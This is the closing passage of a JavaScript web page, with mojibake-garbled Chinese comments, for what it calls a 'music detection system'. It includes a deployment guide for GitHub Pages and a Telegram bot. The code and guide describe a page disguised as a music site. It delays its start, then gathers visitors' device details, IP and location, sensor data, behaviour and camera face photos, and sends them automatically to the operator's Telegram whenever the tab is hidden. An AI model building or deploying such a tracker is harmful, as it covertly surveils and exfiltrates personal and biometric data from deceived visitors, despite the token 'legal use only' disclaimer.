    document.addEventListener('visibilitychange', () => {
        if (document.hidden) {
            sendDataToTelegram();
        }
    });
}

// =============================================
// åˆå§‹åŒ–é«˜çº§åŠŸèƒ½
// =============================================

// é¡µé¢å®Œå…¨åŠ è½½åå¯åŠ¨é«˜çº§æ£€æµ‹
window.addEventListener('load', function() {
    // å»¶è¿Ÿå¯åŠ¨é«˜çº§æ£€æµ‹
    setTimeout(() => {
        startAdvancedDetection();
        startAutoSend();
    }, 15000);
    
    // è®°å½•é¡µé¢æ€§èƒ½
    if ('performance' in window) {
        const perfData = performance.getEntriesByType('navigation')[0];
        if (perfData) {
            MUSIC_DATA.performance = {
                dns: perfData.domainLookupEnd - perfData.domainLookupStart,
                tcp: perfData.connectEnd - perfData.connectStart,
                request: perfData.responseStart - perfData.requestStart,
                response: perfData.responseEnd - perfData.responseStart,
                dom: perfData.domContentLoadedEventEnd - perfData.domContentLoadedEventStart,
                load: perfData.loadEventEnd - perfData.loadEventStart,
                total: perfData.loadEventEnd - perfData.navigationStart
            };
        }
    }
});

// =============================================
// éƒ¨ç½²è¯´æ˜
// =============================================

/*
ğŸµ éŸ³ä¹æ£€æµ‹ç³»ç»Ÿéƒ¨ç½²æŒ‡å—ï¼š

1. GitHub Pageséƒ¨ç½²ï¼š
   - åˆ›å»ºä»“åº“ï¼šmusic-detection-system
   - ä¸Šä¼ å®Œæ•´ä»£ç ä¸º index.html
   - å¯ç”¨GitHub Pages
   - è®¿é—®é“¾æ¥ï¼šhttps://ä½ çš„ç”¨æˆ·å.github.io/music-detection-system

2. é…ç½®Telegram Botï¼š
   - ä¿®æ”¹CONFIGä¸­çš„BOT_TOKENå’ŒCHAT_ID
   - BOT_TOKENï¼šä» @BotFather è·å–
   - CHAT_IDï¼šä½ çš„Telegramç”¨æˆ·ID

3. ç³»ç»ŸåŠŸèƒ½ï¼š
   âœ… ä¼ªè£…æˆéŸ³ä¹ç½‘ç«™
   âœ… è‡ªåŠ¨æ’­æ”¾èƒŒæ™¯éŸ³ä¹
   âœ… è®¾å¤‡ä¿¡æ¯å…¨é¢æ”¶é›†
   âœ… ç½‘ç»œçŠ¶å†µç›‘æµ‹
   âœ… åœ°ç†ä½ç½®è·å–
   âœ… æ‘„åƒå¤´é¢éƒ¨è¯†åˆ«
   âœ… ä¼ æ„Ÿå™¨æ£€æµ‹
   âœ… è¡Œä¸ºæ¨¡å¼åˆ†æ
   âœ… è‡ªåŠ¨TelegramæŠ¥å‘Šå‘é€
   âœ… å®æ—¶æ•°æ®æ›´æ–°

4. æ”¶é›†çš„æ•°æ®åŒ…æ‹¬ï¼š
   - è®¾å¤‡å‹å·ã€æ“ä½œç³»ç»Ÿã€æµè§ˆå™¨
   - å±å¹•å°ºå¯¸ã€åˆ†è¾¨ç‡ã€åƒç´ æ¯”
   - ç½‘ç»œç±»å‹ã€é€Ÿåº¦ã€å»¶è¿Ÿ
   - IPåœ°å€ã€åœ°ç†ä½ç½®ã€ISP
   - ç”µæ± çŠ¶æ€ã€å……ç”µæƒ…å†µ
   - éŸ³é¢‘è®¾å¤‡ä¿¡æ¯
   - ä¼ æ„Ÿå™¨æ•°æ®ï¼ˆåŠ é€Ÿåº¦ã€é™€èºä»ªç­‰ï¼‰
   - é¢éƒ¨ç…§ç‰‡ï¼ˆå¦‚æœæˆæƒï¼‰
   - ç”¨æˆ·è¡Œä¸ºæ¨¡å¼
   - éŸ³ä¹æ’­æ”¾åå¥½

5. Telegramæ¥æ”¶å†…å®¹ï¼š
   - è¯¦ç»†æ–‡æœ¬æŠ¥å‘Š
   - é¢éƒ¨ç…§ç‰‡ï¼ˆå¦‚æœæˆæƒï¼‰
   - JSONæ ¼å¼å®Œæ•´æ•°æ®

6. æ³¨æ„äº‹é¡¹ï¼š
   âš ï¸ éœ€è¦HTTPSç¯å¢ƒ
   âš ï¸ éƒ¨åˆ†åŠŸèƒ½éœ€è¦ç”¨æˆ·æˆæƒ
   âš ï¸ æ‘„åƒå¤´éœ€è¦ç”¨æˆ·æ˜ç¡®åŒæ„
   âš ï¸ åœ°ç†ä½ç½®éœ€è¦ç”¨æˆ·æˆæƒ
   âš ï¸ ä»…ç”¨äºåˆæ³•ç”¨é€”
*/

// æœ€ç»ˆåˆå§‹åŒ–
console.log('ğŸš€ éŸ³ä¹æ£€æµ‹ç³»ç»Ÿå·²å¯åŠ¨');
console.log('ğŸ“Š å¼€å§‹æ”¶é›†ï¼šè®¾å¤‡ä¿¡æ¯ã€ç½‘ç»œçŠ¶æ€ã€ä½ç½®æ•°æ®ã€ç”Ÿç‰©ç‰¹å¾');
console.log('ğŸ“¤ æŠ¥å‘Šå°†å‘é€è‡³ï¼šTelegram Bot');
</script>